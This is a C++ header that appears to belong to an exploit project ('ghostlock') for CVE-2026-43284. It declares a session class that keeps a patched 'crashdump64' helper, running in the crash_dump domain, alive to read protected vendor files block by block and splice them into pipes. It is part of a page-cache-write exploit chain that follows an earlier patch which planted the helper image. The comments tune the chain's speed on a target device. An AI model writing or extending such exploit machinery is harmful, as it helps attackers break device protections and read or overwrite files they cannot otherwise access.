#pragma once
/** @file backend/cve_2026_43284/landing/bridge_session.hpp
 *  The patched helper as one long-lived session instead of one exec per block.
 *
 *  Why this file exists (docs/analysis/persistent-helper-bridge-design.md, measured 2026-10-17): on a
 *  vendor carrier this process cannot open, every sixteen-byte block costs two helper execs -- one for
 *  the preimage the vector is derived from and one for the page that is spliced into the datagram --
 *  and each exec measures around 38 ms on the device (1470 blocks / 114 s). The helper itself is not
 *  slow; starting it is. So the same helper is started once and asked over two channels:
 *
 *  @verbatim
 *    parent (app)                        child (the patched helper)
 *      |-- request socket (fd 0) -------> |  24 B: {op, offset, path_id}, one message per request
 *      |                                  |  splice: the destination pipe arrives as SCM_RIGHTS
 *      |<-- reply pipe (fd 1) ----------- |  16 B: the block, or {status, op echo, echo}
 *  @endverbatim
 *
 *  The child contract (what a session helper has to do) is stated once, here, because both sides are
 *  written against it:
 *   - argv: {argv[0]="crashdump64", argv[1]="0", argv[2]=carrier path, argv[3]="session"}. argv[0..2]
 *     are the retired chain's own convention; argv[3] names the mode, and the one-shot helper reads it
 *     as "not r" and takes its splice branch -- which is exactly why open() ends in a handshake: a
 *     helper that is not a session helper must be refused, not believed.
 *   - request: one message of kBridgeRequestBytes on fd 0. Byte 0 is the op; bytes 8..15 the offset,
 *     bytes 16..23 the path id (0 = the carrier named at exec), little endian. For a splice the
 *     destination pipe's write end rides along as SCM_RIGHTS ancillary data on the same message.
 *   - reply: exactly kBridgeReplyBytes on fd 1. A read answers the block itself. A splice and the
 *     handshake answer {u32 status, u8 op echo, 3 reserved, u64 echo}: status 0 means the whole block
 *     moved, and the echo is the request's offset (splice) or kBridgeSessionMagic (handshake).
 *   - fewer bytes than that, a closed channel, or silence is a failed block, never a partial one.
 *
 *  Fail-closed, as the design requires: a request whose write or reply does not complete within
 *  kBridgeTimeoutMs, a short reply, or a child that went away latches the session dead -- the block
 *  fails and every later block fails with it, which is the same verdict the per-block exec had when
 *  the helper failed. close() is called on every exit path by the owner and is idempotent.
 *
 *  Default off: kBridgeModeDefault is spawn, so nothing in this file runs unless a caller states
 *  kBridgeModeSession. The device that would verify the session is locked (2026-10-17), so the
 *  measured per-block cost of this path is unverified; see the report that shipped with it.
 */
#include <cstddef>
#include <cstdint>

#include <sys/types.h>

#include "backend/cve_2026_43284/landing/pagecache_write.hpp"

namespace ghostlock::backend::cve_2026_43284::landing {
    /** How long a path this bridge will hold, including its terminator. The session holds the same
     *  two strings the one-shot bridge does, under the same rule: a truncated argv is another
     *  command. */
    inline constexpr std::size_t kBridgePathBytes = 256U;

    /** One request on the wire: op(1) | reserved(7) | offset(8) | path id(8). */
    inline constexpr std::size_t kBridgeRequestBytes = 24U;
    /** One reply on the wire: the block for a read, a status word for a splice or the handshake. */
    inline constexpr std::size_t kBridgeReplyBytes = 16U;
    /** How long one request may take, written and answered. The design's number, and the reason it is
     *  so short: a block that cannot be served in this window fails closed rather than stalling the
     *  write. */
    inline constexpr int kBridgeTimeoutMs = 200;
    /** The handshake's echo, so a helper that is not a session helper cannot pass for one. */
    inline constexpr std::uint64_t kBridgeSessionMagic = 0x474c4b5345535331ULL; /* "GLKSESS1" */
    /** Every how many requests the request line is printed (and always on a failure). */
    inline constexpr std::size_t kBridgeLogEveryRequests = 256U;

    /** The helper, running once, answering block requests over two channels. */
    class BridgeSession final {
      public:
        /** How the last call ended. */
        enum class Outcome : unsigned char {
            Never = 0,
            Ok = 1,
            /** bind() was never called, or refused a path. */
            NotBound = 2,
            /** socketpair/pipe failed, so there are no channels to talk over. */
            PipeFailed = 3,
            /** fork() failed, or the child could not be started. */
            SpawnFailed = 4,
            /** The child answered, but not as a session helper: refused before any block is asked. */
            Handshake = 5,
            /** The write or the reply did not complete inside kBridgeTimeoutMs. */
            TimedOut = 6,
            /** The channel closed under us, which is the child going away. */
            ChildGone = 7,
            /** Fewer bytes came back than a reply is. */
            ShortReply = 8,
            /** A whole reply came back, and it is not the answer to what was asked. */
            BadReply = 9,
            /** close() ran; nothing is open any more. */
            Closed = 10,
        };

        BridgeSession() noexcept = default;
        BridgeSession(const BridgeSession &) = delete;
        BridgeSession &operator=(const BridgeSession &) = delete;
        /** Closes the channels and reaps the child, so a session that was opened and forgotten does
         *  not leave a zombie or two descriptors behind. */
        ~BridgeSession() noexcept;

        /**
         *  Bind the patched helper and the carrier it reads.
         *
         *  @param helper_path  The file patch #1 wrote the helper image into.
         *  @param helper_bytes Its length, terminator excluded.
         *  @param carrier_path The vendor file the helper reads; path id 0 of every request.
         *  @param carrier_bytes Its length.
         *  @return True when both paths were accepted. Nothing is started here.
         */
        [[nodiscard]] bool bind(const char *helper_path, std::size_t helper_bytes,
                                const char *carrier_path, std::size_t carrier_bytes) noexcept;

        [[nodiscard]] bool bound() const noexcept { return bound_; }

        /**
         *  Start the session: one fork, the exec the one-shot bridge uses, then a handshake.
         *
         *  @return True when a session helper answered. An open session answers true again; a session
         *          that failed its handshake latches dead and answers false from then on.
         *  @note The child is a helper of the crash_dump domain, so this runs where patch #1 already
         *        put the image; nothing here decides that.
         */
        [[nodiscard]] bool open() noexcept;

        /** One block, asked for by offset. @return kBlockBytes, or -1 (and the session is dead). */
        [[nodiscard]] long read16(std::uint64_t offset, std::uint8_t out[kBlockBytes]) noexcept;

        /** One block, spliced by the child into @p pipe_write_fd (handed over as SCM_RIGHTS, and not
         *  closed by this side). @return kBlockBytes, or -1 (and the session is dead). */
        [[nodiscard]] long splice16_into_pipe(std::uint64_t offset, int pipe_write_fd) noexcept;

        /**
         *  Close both channels and reap the child. Idempotent: a second call closes nothing, waits for
         *  nothing, and leaves the recorded outcome alone.
         *
         *  @note The child is asked to leave by closing the request socket (it sees end of file), and
         *        given a bounded grace of the same 200 ms before it is killed -- a helper that ignores
         *        its stdin must not hold the write open.
         */
        void close() noexcept;

        [[nodiscard]] bool is_open() const noexcept { return open_; }
        /** Whether this session can no longer be used: a failed block latching the rest. */
        [[nodiscard]] bool dead() const noexcept { return dead_; }
        /** The child's pid, or -1 before open() and after close(). */
        [[nodiscard]] pid_t pid() const noexcept { return child_; }
        [[nodiscard]] Outcome last_outcome() const noexcept { return outcome_; }
        [[nodiscard]] int last_status() const noexcept { return last_status_; }
        /** How many requests were attempted, the handshake included. */
        [[nodiscard]] std::size_t requests() const noexcept { return requests_; }
        /** How many of them failed, which is also how many latched the session dead. */
        [[nodiscard]] std::size_t failed_requests() const noexcept { return failed_; }
        /** The request socket (parent end), or -1 when nothing is open. */
        [[nodiscard]] int request_fd() const noexcept { return request_fd_; }
        /** The reply pipe's read end, or -1 when nothing is open. */
        [[nodiscard]] int reply_fd() const noexcept { return reply_fd_; }

      private:
        /** What the child is asked to do. The letters are the log's letters. */
        enum class Op : unsigned char {
            /** Start of session: the child must answer {Ok, Hello, kBridgeSessionMagic}. */
            Hello = 0x48U,
            Read = 0x52U,
            Splice = 0x53U,
        };

        /** One round trip: write a request, read a reply, and hold it to the op's own shape.
         *  @param op         What the child is asked for; the reply is judged by it.
         *  @param offset     The carrier offset; also the echo a splice's status must carry back.
         *  @param fd_to_pass The splice destination, or -1 to pass none.
         *  @param out        Receives the block for a read; untouched otherwise.
         *  @return kBridgeReplyBytes on success, -1 otherwise (and the session is dead). */
        [[nodiscard]] long request(Op op, std::uint64_t offset, int fd_to_pass,
                                   std::uint8_t *out) noexcept;
        /** One message on the request socket, inside the deadline. */
        [[nodiscard]] bool send_request(Op op, std::uint64_t offset, int fd_to_pass,
                                        std::int64_t deadline_us) noexcept;
        /** Exactly one reply out of the pipe, inside the same deadline. */
        [[nodiscard]] bool read_reply(std::uint8_t out[kBridgeReplyBytes],
                                      std::int64_t deadline_us) noexcept;
        /** Refuse anything that does not introduce itself as a session helper. */
        [[nodiscard]] bool handshake() noexcept;
        /** Closes whatever is open among the parent ends. @return how many descriptors it closed. */
        [[nodiscard]] int close_channels() noexcept;

        char helper_[kBridgePathBytes] = {};
        char carrier_[kBridgePathBytes] = {};
        bool bound_ = false;
        bool open_ = false;
        /** A failed block latches this: the design's fail-closed rule, kept in one place. */
        bool dead_ = false;
        pid_t child_ = -1;
        int request_fd_ = -1;
        int reply_fd_ = -1;
        Outcome outcome_ = Outcome::Never;
        int last_status_ = 0;
        std::size_t requests_ = 0U;
        std::size_t failed_ = 0U;
    };
}  // namespace ghostlock::backend::cve_2026_43284::landing
